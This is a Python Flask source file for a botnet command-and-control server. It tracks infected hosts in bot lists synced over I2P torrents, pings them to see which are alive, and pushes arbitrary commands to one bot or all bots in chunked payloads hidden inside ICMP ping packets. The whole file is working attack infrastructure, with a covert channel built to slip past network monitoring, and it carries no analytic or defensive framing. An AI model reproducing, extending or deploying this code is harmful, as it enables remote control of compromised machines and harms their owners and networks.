from flask import Flask, request, jsonify
import os
import threading
import time
import random
import requests
import json
import hashlib
import struct
import subprocess

app = Flask(__name__)
SHARED_DIR = "shared_bots"
MAGNET_FILE = "magnet_links.txt"
BOT_LIST = "bots.txt"
COMMAND_FILE = "commands.json"

os.makedirs(SHARED_DIR, exist_ok=True)
if not os.path.exists(BOT_LIST):
    open(BOT_LIST, "w").close()
if not os.path.exists(COMMAND_FILE):
    with open(COMMAND_FILE, "w") as f:
        f.write("{}")

# === Utilities ===

def safe_load_json(path):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Error loading JSON from {path}: {e}")
        return {}

def safe_save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[!] Error saving JSON to {path}: {e}")

def load_all_bots():
    bots = set()
    try:
        with open(BOT_LIST) as f:
            bots.update(line.strip() for line in f if line.strip())
    except Exception as e:
        print(f"[!] Failed to read {BOT_LIST}: {e}")

    for fname in os.listdir(SHARED_DIR):
        try:
            with open(os.path.join(SHARED_DIR, fname)) as f:
                bots.update(line.strip() for line in f if line.strip())
        except Exception as e:
            print(f"[!] Failed to read {fname}: {e}")
    return list(bots)

# === Start i2psnark torrents ===

def check_i2p():
    try:
        r = requests.get("http://127.0.0.1:7657/", timeout=5)
        return r.status_code == 200
    except Exception as e:
        print("[!] I2P is not reachable on 127.0.0.1:7657. Check if it's running.")
        return False

def start_i2p_torrents():
    if not os.path.exists(MAGNET_FILE):
        print("[*] No magnet_links.txt found.")
        return
    with open(MAGNET_FILE) as f:
        for line in f:
            magnet = line.strip()
            if magnet:
                try:
                    requests.post("http://127.0.0.1:7657/i2psnark/",
                                  data={"action": "Add Torrent", "magnet": magnet}, timeout=10)
                    print(f"[✓] Added magnet: {magnet}")
                except Exception as e:
                    print(f"[!] Failed to add magnet: {magnet} — {e}")

def sync_shared_bots():
    while True:
        bots = load_all_bots()
        try:
            with open(BOT_LIST, "w") as f:
                for bot in sorted(set(bots)):
                    f.write(bot + "\n")
        except Exception as e:
            print(f"[!] Could not update bots.txt: {e}")
        time.sleep(60)

# === ICMP Command Protocol ===

def send_icmp_packet(ip, icmp_payload):
    try:
        # Uses ping with -p to inject raw hex payload (requires root)
        hex_payload = icmp_payload.hex()
        subprocess.run(["ping", "-c", "1", "-p", hex_payload, ip],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] Error sending ICMP to {ip}: {e}")

def make_icmp_payload(payload_type, chunk_num, payload):
    sig = b"FILEXFER"         # 8 bytes
    typ = struct.pack("B", payload_type)
    chunk = struct.pack(">H", chunk_num)
    h = hashlib.sha256(payload).digest()  # 32 bytes hash
    return sig + typ + chunk + h + payload

def send_command_icmp(ip, full_command):
    # Split into 100 byte chunks
    CHUNK_SIZE = 100
    chunks = [full_command[i:i+CHUNK_SIZE].encode() for i in range(0, len(full_command), CHUNK_SIZE)]

    # START
    send_icmp_packet(ip, make_icmp_payload(0, 0, b"command.txt"))
    time.sleep(0.3)

    # CHUNKS
    for i, chunk in enumerate(chunks):
        send_icmp_packet(ip, make_icmp_payload(1, i, chunk))
        time.sleep(0.3)

    # END
    send_icmp_packet(ip, make_icmp_payload(2, len(chunks), hashlib.sha256(full_command.encode()).digest()))

# === Flask Endpoints ===

@app.route("/")
def index():
    return "C2 Server with I2P + ICMP is running."

@app.route("/check")
def check():
    result = {"i2p_ok": check_i2p()}
    result["torrents_loaded"] = os.path.exists(MAGNET_FILE)
    result["shared_bots_dir"] = os.path.isdir(SHARED_DIR)
    result["known_bots"] = len(load_all_bots())
    return jsonify(result)

@app.route("/bots")
def bots():
    return jsonify(load_all_bots())

@app.route("/heartbeat")
def heartbeat():
    bots = load_all_bots()
    alive = []
    for bot in bots:
        try:
            result = subprocess.run(["ping", "-c", "1", "-W", "1", bot],
                                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            if "1 received" in result.stdout.decode():
                alive.append(bot)
        except:
            pass
    return jsonify({"alive": alive, "count": len(alive)})

@app.route("/sendcmd", methods=["POST"])
def send_cmd():
    data = request.json
    botid = data.get("botid")
    cmd = data.get("cmd")
    if not botid or not cmd:
        return jsonify({"error": "Missing botid or cmd"}), 400

    print(f"[>] Sending command to {botid} via ICMP...")
    send_command_icmp(botid, cmd)

    cmds = safe_load_json(COMMAND_FILE)
    cmds[botid] = cmd
    safe_save_json(COMMAND_FILE, cmds)
    return jsonify({"status": "ICMP command sent to bot."})

@app.route("/runall", methods=["POST"])
def runall():
    data = request.json
    cmd = data.get("cmd")
    if not cmd:
        return jsonify({"error": "Missing cmd"}), 400

    print(f"[>] Broadcasting command via ICMP to all known bots...")
    bots = load_all_bots()
    for bot in bots:
        send_command_icmp(bot, cmd)
        time.sleep(0.1)

    return jsonify({"status": f"Command sent via ICMP to {len(bots)} bots."})

# === Server Boot ===

def run():
    print("[*] Checking I2P connection...")
    if not check_i2p():
        print("[!] WARNING: I2P is not reachable. Proceeding anyway.")

    print("[*] Starting I2P torrent syncing...")
    start_i2p_torrents()

    print("[*] Sync thread started.")
    threading.Thread(target=sync_shared_bots, daemon=True).start()

    print("[*] Flask server listening on 0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080)

if __name__ == "__main__":
    run()
